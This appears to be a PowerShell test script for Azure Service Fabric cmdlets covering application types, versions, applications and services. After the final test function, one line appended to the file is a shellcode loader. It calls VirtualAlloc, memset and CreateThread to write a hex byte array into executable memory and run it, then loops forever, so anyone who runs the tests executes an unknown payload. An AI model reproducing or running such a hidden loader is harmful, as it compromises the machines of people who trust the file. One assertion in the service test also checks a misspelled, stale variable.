













$clusterName = Get-ClusterName
$resourceGroupName = Get-ResourceGroupName
$appTypeName = Get-AppTypeName
$v1 = Get-AppTypeV1Name
$v2 = Get-AppTypeV2Name
$packageV1 = Get-AppPackageV1
$packageV2 = Get-AppPackageV2
$serviceTypeName = Get-ServiceTypeName

function Test-AppType
{
	$appType = Get-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName
	Assert-Null $appType

	$appType = New-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Verbose
	Assert-AreEqual  "Succeeded" $appType.ProvisioningState

	$appTypeFromGet = Get-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName
	Assert-NotNull $appTypeFromGet
	Assert-AreEqual $appType.Id $appTypeFromGet.Id

	$removeResponse = Remove-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Force -PassThru -Verbose
	Assert-True { $removeResponse }
	
	Assert-ThrowsContains { Get-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName } "NotFound"
}

function Test-AppTypeVersion
{
	$appTypeVersion = Get-AzServiceFabricApplicationTypeVersion -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName
	Assert-Null $appTypeVersion

	$appTypeVersion = New-AzServiceFabricApplicationTypeVersion -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Version $v1 -PackageUrl $packageV1 -Verbose
	Assert-AreEqual "Succeeded" $appTypeVersion.ProvisioningState

	$appTypeVersionFromGet = Get-AzServiceFabricApplicationTypeVersion -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Version $v1
	Assert-NotNull $appTypeVersionFromGet
	Assert-AreEqual $appTypeVersion.Id $appTypeVersionFromGet.Id

	$removeResponse = Remove-AzServiceFabricApplicationTypeVersion -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Version $v1 -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	$removeResponse = Remove-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	Assert-ThrowsContains { Get-AzServiceFabricApplicationTypeVersion -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Version $v1 } "NotFound"
}

function Test-App
{
	$appName = getAssetName "testApp"
	$serviceName = getAssetName "testService"
	$serviceName = "$($appName)~$($serviceName)"

	$app = Get-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName
	Assert-Null $app

	$app = New-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -ApplicationTypeName $appTypeName -ApplicationTypeVersion $v1 -Name $appName -PackageUrl $packageV1 -Verbose
	Assert-AreEqual "Succeeded" $app.ProvisioningState

	$appFromGet = Get-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appName
	Assert-NotNull $appFromGet
	Assert-AreEqual $app.Id $appFromGet.Id

	$service = New-AzServiceFabricService -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Stateless -InstanceCount -1 -ApplicationName $appName -Name $serviceName -Type $serviceTypeName -PartitionSchemeSingleton -Verbose
	Assert-AreEqual "Succeeded" $service.ProvisioningState

	$appTypeVersion = New-AzServiceFabricApplicationTypeVersion -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Version $v2 -PackageUrl $packageV2 -Verbose
	Assert-AreEqual "Succeeded" $appTypeVersion.ProvisioningState

	$app = Update-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appName -ApplicationTypeVersion $v2 `
		-ApplicationParameter @{Mode="decimal"} -HealthCheckStableDurationSec 0 -HealthCheckWaitDurationSec 0 -HealthCheckRetryTimeoutSec 0 `
		-UpgradeDomainTimeoutSec 5000 -UpgradeTimeoutSec 7000 -FailureAction Rollback -UpgradeReplicaSetCheckTimeoutSec 300 -ForceRestart -Verbose
	Assert-AreEqual "Succeeded" $app.ProvisioningState
	Assert-AreEqual $v2 $app.TypeVersion
	Assert-AreEqual "decimal" $app.Parameters["Mode"]
	Assert-True { $app.UpgradePolicy.ForceRestart }
	Assert-AreEqual "00:05:00" $app.UpgradePolicy.UpgradeReplicaSetCheckTimeout
	Assert-AreEqual "01:56:40" $app.UpgradePolicy.RollingUpgradeMonitoringPolicy.UpgradeTimeout
	Assert-AreEqual "01:23:20" $app.UpgradePolicy.RollingUpgradeMonitoringPolicy.UpgradeDomainTimeout
	Assert-AreEqual "Rollback" $app.UpgradePolicy.RollingUpgradeMonitoringPolicy.FailureAction

	$app = Update-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appName -MinimumNodeCount 1 -MaximumNodeCount 4 -Verbose
	Assert-AreEqual 1 $app.MinimumNodes
	Assert-AreEqual 4 $app.MaximumNodes

	$removeResponse = Remove-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appName -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	$removeResponse = Remove-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	Assert-ThrowsContains { Get-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appName } "NotFound"
}

function Test-Service
{
	$appName = getAssetName "testApp"
	$serviceName = getAssetName "testService"
	$serviceName = "$($appName)~$($serviceName)"

	$app = New-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -ApplicationTypeName $appTypeName -ApplicationTypeVersion $v1 -Name $appName -PackageUrl $packageV1 -Verbose
	Assert-AreEqual "Succeeded" $app.ProvisioningState

	$service = Get-AzServiceFabricService -ResourceGroupName $resourceGroupName -ClusterName $clusterName -ApplicationName $appName
	Assert-Null $service

	$service = New-AzServiceFabricService -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Stateless -InstanceCount -1 -ApplicationName $appName -Name $serviceName -Type $serviceTypeName -PartitionSchemeSingleton -Verbose
	Assert-AreEqual "Succeeded" $service.ProvisioningState

	$serviceFromGet = Get-AzServiceFabricService -ResourceGroupName $resourceGroupName -ClusterName $clusterName -ApplicationName $appName -Name $serviceName
	Assert-NotNull $serviceFromGet
	Assert-AreEqual $service.Id $serviceFromGet.Id

	$removeResponse = Remove-AzServiceFabricService -ResourceGroupName $resourceGroupName -ClusterName $clusterName -ApplicationName $appName -Name $serviceName -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	$removeRespoetnse = Remove-AzServiceFabricApplication -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appName -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	$removeResponse = Remove-AzServiceFabricApplicationType -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $appTypeName -Force -PassThru -Verbose
	Assert-True { $removeResponse }

	Assert-ThrowsContains { Get-AzServiceFabricService -ResourceGroupName $resourceGroupName -ClusterName $clusterName -ApplicationName $appName -Name $serviceName } "NotFound"
}
$BRmX = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BRmX -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xd9,0x74,0x24,0xf4,0xbe,0x8b,0xc9,0x92,0xaf,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x14,0x03,0x72,0x9f,0x2b,0x67,0x53,0x77,0x29,0x88,0xac,0x87,0x4e,0x00,0x49,0xb6,0x4e,0x76,0x19,0xe8,0x7e,0xfc,0x4f,0x04,0xf4,0x50,0x64,0x9f,0x78,0x7d,0x8b,0x28,0x36,0x5b,0xa2,0xa9,0x6b,0x9f,0xa5,0x29,0x76,0xcc,0x05,0x10,0xb9,0x01,0x47,0x55,0xa4,0xe8,0x15,0x0e,0xa2,0x5f,0x8a,0x3b,0xfe,0x63,0x21,0x77,0xee,0xe3,0xd6,0xcf,0x11,0xc5,0x48,0x44,0x48,0xc5,0x6b,0x89,0xe0,0x4c,0x74,0xce,0xcd,0x07,0x0f,0x24,0xb9,0x99,0xd9,0x75,0x42,0x35,0x24,0xba,0xb1,0x47,0x60,0x7c,0x2a,0x32,0x98,0x7f,0xd7,0x45,0x5f,0x02,0x03,0xc3,0x44,0xa4,0xc0,0x73,0xa1,0x55,0x04,0xe5,0x22,0x59,0xe1,0x61,0x6c,0x7d,0xf4,0xa6,0x06,0x79,0x7d,0x49,0xc9,0x08,0xc5,0x6e,0xcd,0x51,0x9d,0x0f,0x54,0x3f,0x70,0x2f,0x86,0xe0,0x2d,0x95,0xcc,0x0c,0x39,0xa4,0x8e,0x58,0x8e,0x85,0x30,0x98,0x98,0x9e,0x43,0xaa,0x07,0x35,0xcc,0x86,0xc0,0x93,0x0b,0xe9,0xfa,0x64,0x83,0x14,0x05,0x95,0x8d,0xd2,0x51,0xc5,0xa5,0xf3,0xd9,0x8e,0x35,0xfc,0x0f,0x3a,0x33,0x6a,0xaf,0xb8,0xd7,0x31,0xa7,0xbc,0x27,0xd6,0xf5,0x48,0xc1,0x88,0xa9,0x1a,0x5e,0x68,0x1a,0xdb,0x0e,0x00,0x70,0xd4,0x71,0x30,0x7b,0x3e,0x1a,0xda,0x94,0x97,0x72,0x72,0x0c,0xb2,0x09,0xe3,0xd1,0x68,0x74,0x23,0x59,0x9f,0x88,0xed,0xaa,0xea,0x9a,0x99,0x5a,0xa1,0xc1,0x0f,0x64,0x1f,0x6f,0xaf,0xf0,0xa4,0x26,0xf8,0x6c,0xa7,0x1f,0xce,0x32,0x58,0x4a,0x45,0xfa,0xcc,0x35,0x31,0x03,0x01,0xb6,0xc1,0x55,0x4b,0xb6,0xa9,0x01,0x2f,0xe5,0xcc,0x4d,0xfa,0x99,0x5d,0xd8,0x05,0xc8,0x32,0x4b,0x6e,0xf6,0x6d,0xbb,0x31,0x09,0x58,0x3d,0x0d,0xdc,0xa4,0x4b,0x7f,0xdc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$IsL=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($IsL.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$IsL,0,0,0);for (;;){Start-sleep 60};

